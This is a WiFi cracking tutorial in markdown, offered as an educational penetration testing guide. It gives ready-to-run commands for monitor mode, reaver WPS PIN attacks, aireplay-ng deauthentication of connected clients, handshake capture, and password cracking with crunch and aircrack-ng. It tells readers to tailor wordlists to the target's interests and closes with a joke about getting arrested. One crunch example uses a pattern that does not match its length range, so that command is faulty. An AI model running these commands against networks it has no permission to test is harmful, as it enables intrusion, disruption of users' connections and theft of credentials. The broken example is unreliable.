# WiFi Penetration Testing Guide

> **Disclaimer:** This guide is for educational purposes only. Unauthorized use of these tools on networks you do not own or have permission to test is illegal.

## Table of Contents
- [Setting Up Monitor Mode](#setting-up-monitor-mode)
- [Scanning for Networks](#scanning-for-networks)
- [Performing WPS Attacks](#performing-wps-attacks)
- [Performing WPA/WPA2 Handshake Capture](#performing-wpapawpa2-handshake-capture)
- [Cracking WPA/WPA2 Passwords](#cracking-wpapawpa2-passwords)
- [Tips and Best Practices](#tips-and-best-practices)

---

## Setting Up Monitor Mode

Before we begin, we need to configure our wireless interface for monitoring.

### 1. List Available Interfaces
```bash
iwconfig
```
This command shows all available wireless devices/interfaces.

### 2. Turn Off the Interface

Replace `wlan1` with your actual interface name.
```bash
ifconfig wlan1 down
```

### 3. Kill Network Processes

This ensures no processes interfere with our testing.
```bash
airmon-ng check kill
```

### 4. Enable Monitor Mode
```bash
iwconfig wlan1 mode monitor
```

### 5. Turn the Interface Back On
```bash
ifconfig wlan1 up
```

### 6. Verify Monitor Mode

Run `iwconfig` again to confirm that `wlan1` is in monitor mode.

---

## Scanning for Networks

Now that the interface is ready, let's scan for nearby networks.

### Scan 2.4 GHz Networks
```bash
airodump-ng wlan1
```

### Scan 5 GHz Networks
```bash
airodump-ng --band a wlan1
```

### Scan Both Bands (2.4 GHz & 5 GHz)
```bash
airodump-ng --band abg wlan1
```

### Capture Data to a File

To save the scan results, specify the target network's BSSID (MAC address), channel, and output file:
```bash
airodump-ng --bssid <target_mac> --channel <channel> --write capture_file wlan1
```

---

## Performing WPS Attacks

WPS (Wi-Fi Protected Setup) attacks can be used to exploit vulnerabilities in routers that support WPS.

### 1. Find Networks with WPS Enabled

Use `wash` to list nearby networks with WPS enabled:
```bash
wash --interface wlan1
```

### 2. Perform a WPS Attack

Replace `<target_mac>` with the router's MAC address and `<channel>` with the correct channel:
```bash
reaver --bssid <target_mac> --channel <channel> --interface wlan1 -vvv --no-associate
```
- `-vvv`: Verbose mode for detailed output.
- `--no-associate`: Manually associate with the network instead of relying on Reaver's built-in association feature.

---

## Performing WPA/WPA2 Handshake Capture

To crack WPA/WPA2 passwords, we first need to capture the handshake between the router and a connected client.

### 1. Start Capturing Handshakes

Replace `<target_mac>` and `<channel>` with the appropriate values:
```bash
airodump-ng --bssid <target_mac> --channel <channel> --write wpa_handshake wlan1
```
Let this run until the handshake is captured.

### 2. Force a Deauthentication Attack

To speed up the handshake capture, deauthenticate a connected client:
```bash
aireplay-ng --deauth 4 -a <target_mac> -c <client_mac> wlan1
```
- `-a`: Target network's MAC address.
- `-c`: Connected client's MAC address.

---

## Cracking WPA/WPA2 Passwords

Once you've captured the handshake, you can attempt to crack the password using a wordlist.

### 1. Generate a Wordlist with Crunch

Use `crunch` to generate a custom wordlist. For example:
```bash
crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
```
- `6 8`: Minimum and maximum password lengths.
- `abcdefghijklmnopqrstuvwxyz0123456789`: Character set.
- `-o wordlist.txt`: Output file.

You can also use the `-t` option to include known patterns:
```bash
crunch 6 8 abc123 -t @@@@ -o wordlist.txt
```

### 2. Use Aircrack-ng to Crack the Password
```bash
aircrack-ng wpa_handshake-01.cap -w wordlist.txt
```
- `wpa_handshake-01.cap`: The handshake file.
- `wordlist.txt`: Your generated wordlist.

Aircrack-ng will attempt to match each password in the wordlist with the captured handshake.

---

## Tips and Best Practices

- **Stay Legal:** Always obtain explicit permission before testing any network.
- **Optimize Wordlists:** Use intelligent wordlists based on the target's interests or publicly available information.
- **Monitor Performance:** Large wordlists can take significant time to process. Start with smaller lists for faster results.
- **Update Tools:** Ensure all tools are up-to-date for the best performance and compatibility.

---

dont get yourselves arrested lol





  

